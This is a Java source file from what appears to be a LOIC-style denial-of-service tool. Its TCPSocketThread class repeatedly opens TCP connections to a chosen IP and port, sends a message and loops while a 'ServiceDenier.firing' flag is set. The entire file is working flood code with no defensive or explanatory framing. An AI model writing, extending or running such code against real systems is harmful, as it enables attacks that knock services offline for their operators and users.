package genius.mohammad.loic;

import java.io.OutputStreamWriter;
import java.net.InetSocketAddress;
import java.net.Socket;

public class TCPSocketThread implements Runnable {

	private String ip, message;
	private int port, timeout, pause;
	
	public static long startTime = 0;
	public static int count = 0;

	public TCPSocketThread(String ip, int port, int timeout, String message, int pause) {
		this.ip = ip;
		this.port = port;
		this.timeout = timeout;
		this.message = message;
		this.pause = pause;
	}

	public void run() {
		count = 0;
		startTime = System.currentTimeMillis();
		Socket socket;
		while (ServiceDenier.firing) {
			try {
				socket = new Socket();
				socket.connect(new InetSocketAddress(ip, port), timeout);
				OutputStreamWriter out = new OutputStreamWriter(socket.getOutputStream());
				out.write(message);
				out.close();
				socket.close();
				count++;
				Thread.sleep(pause);
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
}
